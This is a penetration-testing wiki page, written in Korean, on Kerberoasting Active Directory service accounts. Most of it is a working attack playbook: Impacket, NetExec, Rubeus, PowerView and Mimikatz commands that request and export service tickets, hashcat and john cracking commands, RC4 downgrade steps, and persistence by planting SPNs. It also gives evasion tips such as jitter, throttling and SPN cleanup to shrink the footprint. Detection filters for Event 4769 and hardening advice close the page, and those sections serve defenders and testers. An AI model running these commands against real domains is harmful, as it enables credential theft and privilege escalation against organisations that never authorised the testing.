# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting은 TGS 티켓, 특히 컴퓨터 계정을 제외하고 Active Directory(AD)에서 사용자 계정으로 실행되는 서비스와 관련된 티켓을 획득하는 데 초점을 둡니다. 이러한 티켓은 사용자 암호에서 파생된 키로 암호화되므로 오프라인에서 자격 증명을 크래킹할 수 있습니다. 서비스가 사용자 계정으로 실행된다는 것은 비어 있지 않은 ServicePrincipalName(SPN) 속성으로 확인할 수 있습니다.

인증된 도메인 사용자는 누구나 TGS 티켓을 요청할 수 있으므로 특별한 권한이 필요하지 않습니다.<sup>[[4]](#references)[[5]](#references)</sup>

### 핵심 사항

- 사용자 계정으로 실행되는 서비스의 TGS 티켓을 대상으로 합니다(SPN이 설정된 계정이며, 컴퓨터 계정은 아님).
- 티켓은 서비스 계정 암호에서 파생된 키로 암호화되며 오프라인에서 크래킹할 수 있습니다.
- 높은 권한은 필요하지 않습니다. 인증된 계정이라면 누구나 TGS 티켓을 요청할 수 있습니다.

> [!WARNING]
> 대부분의 공개 도구는 AES보다 크래킹 속도가 빠른 RC4-HMAC(etype 23) 서비스 티켓을 우선 요청합니다. RC4 TGS 해시는 `$krb5tgs$23$*`로 시작하고, AES128은 `$krb5tgs$17$*`, AES256은 `$krb5tgs$18$*`로 시작합니다. 하지만 AES만 사용하는 환경이 늘고 있습니다. RC4만 중요하다고 가정하지 마세요.
> 또한 “spray-and-pray” 방식의 roasting은 피하세요. Rubeus의 기본 kerberoast 기능은 모든 SPN을 조회하고 티켓을 요청할 수 있어 탐지되기 쉽습니다. 먼저 흥미로운 주체를 열거하고 표적으로 삼으세요.

### 서비스 계정의 비밀과 Kerberos 암호화 비용

많은 서비스가 여전히 사람이 직접 관리하는 암호를 사용하는 사용자 계정으로 실행됩니다. KDC는 해당 암호에서 파생된 키로 서비스 티켓을 암호화한 뒤, 암호문을 인증된 모든 주체에게 전달합니다. 따라서 kerberoasting을 이용하면 계정 잠금이나 DC 텔레메트리 없이 오프라인 추측을 무제한으로 수행할 수 있습니다. 암호화 모드에 따라 크래킹에 필요한 비용이 달라집니다.

| 모드 | 키 파생 | 암호화 유형 | 대략적인 RTX 5090 처리량* | 참고 |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | 도메인 + SPN으로 생성한 주체별 salt와 4,096회 반복하는 PBKDF2-HMAC-SHA1 | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | 초당 약 680만 회 추측 | Salt는 rainbow table을 무력화하지만 짧은 암호는 여전히 빠르게 크래킹할 수 있습니다. |
| RC4 + NT hash | 암호를 단일 MD4 처리(unsalted NT hash); Kerberos는 티켓별 8바이트 confounder만 추가 | etype 23 (`$krb5tgs$23$`) | 초당 약 **41억** 회 추측 | AES보다 약 1000배 빠릅니다. 공격자는 `msDS-SupportedEncryptionTypes`에서 허용하는 경우 RC4를 강제합니다. |

*Matthew Green의 [Kerberoasting 분석](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)에서 인용한 Chick3nman의 벤치마크입니다.<sup>[[3]](#references)</sup>

RC4의 confounder는 keystream만 무작위화하며 추측 1회당 필요한 작업량을 늘리지 않습니다. 서비스 계정이 무작위 비밀(gMSA/dMSA, 컴퓨터 계정 또는 vault에서 관리하는 문자열)을 사용하지 않는 한, 침해 속도는 전적으로 GPU 예산에 달려 있습니다. AES 전용 etype을 강제하면 초당 수십억 회 추측이 가능한 다운그레이드를 막을 수 있지만, 취약한 사람이 만든 암호는 여전히 PBKDF2로 크래킹될 수 있습니다.<sup>[[3]](#references)</sup>

### 공격

#### Linux

NetExec으로 크래킹 가능한 티켓을 요청하고 Hashcat으로 크래킹하는 실용적인 엔드투엔드 예제는 참고 자료 [1]에서 확인할 수 있습니다.<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

kerberoast 검사를 포함하는 다기능 도구:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- kerberoastable 사용자 열거

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- 기법 1: TGS를 요청하고 메모리에서 덤프하기

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Technique 2: 자동화 도구

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> TGS 요청은 Windows Security Event 4769 (A Kerberos service ticket was requested)을 생성합니다.

### OPSEC 및 AES 전용 환경

- AES를 지원하지 않는 계정에는 의도적으로 RC4를 요청합니다:
  - Rubeus: `/rc4opsec`은 tgtdeleg을 사용해 AES를 지원하지 않는 계정을 열거하고 RC4 service ticket을 요청합니다.
  - Rubeus: kerberoast와 함께 `/tgtdeleg`을 사용하면 가능한 경우 RC4 요청도 발생합니다.<sup>[[6]](#references)</sup>
- AES 전용 계정도 조용히 실패하는 대신 roast합니다:
  - Rubeus: `/aes`는 AES가 활성화된 계정을 열거하고 AES service ticket(etype 17/18)을 요청합니다.
  - 이미 TGT(PTT 또는 .kirbi 파일)를 보유하고 있다면, `/spn:<SPN>` 또는 `/spns:<file>`과 함께 `/ticket:<blob|path>`를 사용해 LDAP를 건너뛸 수 있습니다.
- 대상 지정, 요청 속도 제한 및 노이즈 감소:
  - `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>`, `/jitter:<1-100>`을 사용합니다.
  - `/pwdsetbefore:<MM-dd-yyyy>`로 취약한 비밀번호일 가능성이 높은 계정(오래된 비밀번호)을 필터링하거나, `/ou:<DN>`으로 권한 있는 OU를 대상으로 지정합니다.<sup>[[8]](#references)</sup>

예시 (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### 지속성 / 악용

계정을 제어하거나 수정할 수 있다면 SPN을 추가해 해당 계정을 kerberoastable하게 만들 수 있습니다:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

더 쉽게 cracking할 수 있도록 계정을 downgrade하여 RC4를 활성화합니다(대상 객체에 대한 쓰기 권한 필요):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### 사용자에 대한 GenericWrite/GenericAll을 통한 Targeted Kerberoast (임시 SPN)

BloodHound에서 사용자 객체(예: GenericWrite/GenericAll)를 제어할 수 있는 것으로 표시되면, 현재 SPN이 없는 사용자라도 해당 사용자를 대상으로 안정적으로 “targeted-roast”할 수 있습니다:<sup>[[9]](#references)</sup>

- 제어 중인 사용자에게 임시 SPN을 추가해 roastable 상태로 만듭니다.
- 크래킹을 우선시하기 위해 해당 SPN에 대해 RC4(etype 23)로 암호화된 TGS-REP를 요청합니다.
- hashcat으로 `$krb5tgs$23$...` 해시를 크랙합니다.
- footprint를 줄이기 위해 SPN을 정리합니다.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux 원라이너 (targetedKerberoast.py는 SPN 추가 -> TGS 요청 (etype 23) -> SPN 제거를 자동화합니다):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

출력값을 hashcat autodetect로 크랙합니다 (`$krb5tgs$23$`의 경우 mode 13100):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

탐지 참고 사항: SPN을 추가하거나 제거하면 디렉터리 변경이 발생하고(대상 사용자에 대한 Event ID 5136/4738), TGS 요청은 Event ID 4769를 생성합니다. 요청 빈도를 조절하고 즉시 정리하는 것을 고려하세요.

Kerberoast 공격에 유용한 도구는 여기에서 확인할 수 있습니다: https://github.com/nidem/kerberoast

Linux에서 다음 오류가 발생하면: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` 이는 로컬 시간 차이 때문입니다. DC와 시간을 동기화하세요.

- `ntpdate <DC_IP>` (일부 배포판에서는 deprecated)
- `rdate -n <DC_IP>`

### 도메인 계정 없이 Kerberoast (AS-requested STs)

2022년 9월, Charlie Clark은 principal에 pre-authentication이 필요하지 않은 경우 요청 본문에서 sname을 변경해 조작된 KRB_AS_REQ를 통해 서비스 티켓을 얻을 수 있으며, 사실상 TGT 대신 서비스 티켓을 받을 수 있음을 보였습니다. 이는 AS-REP roasting과 유사하며 유효한 도메인 자격 증명이 필요하지 않습니다.

자세한 내용은 Semperis의 “New Attack Paths: AS-requested STs” 글을 참조하세요.<sup>[[10]](#references)</sup>

> [!WARNING]
> 유효한 자격 증명이 없으면 이 기법으로 LDAP를 조회할 수 없으므로 사용자 목록을 제공해야 합니다.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

관련

AS-REP roastable 사용자를 대상으로 하는 경우, 다음도 참조하세요.

{{#ref}}
asreproast.md
{{#endref}}

### 탐지

Kerberoasting은 은밀하게 수행될 수 있습니다. DC에서 Event ID 4769를 찾아 노이즈를 줄이는 필터를 적용하세요.

- 서비스 이름 `krbtgt`와 `$`로 끝나는 서비스 이름(컴퓨터 계정)은 제외합니다.
- 컴퓨터 계정의 요청(`*$$@*`)은 제외합니다.
- 성공한 요청만 대상으로 합니다(Failure Code `0x0`).
- 암호화 유형을 추적합니다: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). `0x17`만으로 경고하지 마세요.

PowerShell 분류 예시:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Additional ideas:

- 기준이 되는 호스트/사용자별 일반적인 SPN 사용량을 파악하고, 단일 principal에서 서로 다른 SPN 요청이 대량으로 발생하면 경고합니다.
- AES로 보안이 강화된 도메인에서 비정상적인 RC4 사용을 표시합니다.

### Mitigation / Hardening

- 서비스에는 gMSA/dMSA 또는 machine account를 사용합니다. 관리 계정은 120자 이상의 무작위 비밀번호를 사용하고 자동으로 교체되므로 오프라인 cracking이 사실상 불가능합니다.<sup>[[7]](#references)</sup>
- 서비스 계정의 `msDS-SupportedEncryptionTypes`를 AES-only(10진수 24 / 16진수 0x18)로 설정해 AES를 적용한 다음, 비밀번호를 교체하여 AES 키를 파생합니다.<sup>[[7]](#references)</sup>
- 가능한 경우 환경에서 RC4를 비활성화하고 RC4 사용 시도를 모니터링합니다. DC에서는 `msDS-SupportedEncryptionTypes`가 설정되지 않은 계정의 기본값을 지정하기 위해 `DefaultDomainSupportedEncTypes` 레지스트리 값을 사용할 수 있습니다. 충분히 테스트하세요.
- 사용자 계정에서 불필요한 SPN을 제거합니다.<sup>[[7]](#references)</sup>
- 관리 계정을 사용할 수 없는 경우 길고 무작위적인 서비스 계정 비밀번호(25자 이상)를 사용합니다. 흔히 쓰이는 비밀번호는 금지하고 정기적으로 감사를 수행합니다.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – 실제 환경에서의 NetExec LDAP kerberoast 및 hashcat cracking](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: 레거시 Kerberos 암호화 기반의 저기술·고영향 공격 (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos를 공격하는 방법은?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos 악용: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES가 활성화된 상태에서 RC4로 암호화된 TGS 요청하기](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Kerberoasting 완화를 위한 Microsoft의 지침](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast 명령 문서](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL 자격 증명 → Targeted Kerberoast → Unconstrained Delegation → DCSync로 DA 획득](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – 새로운 공격 경로? 요청된 서비스 티켓(Charlie Clark, 2022년 9월)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
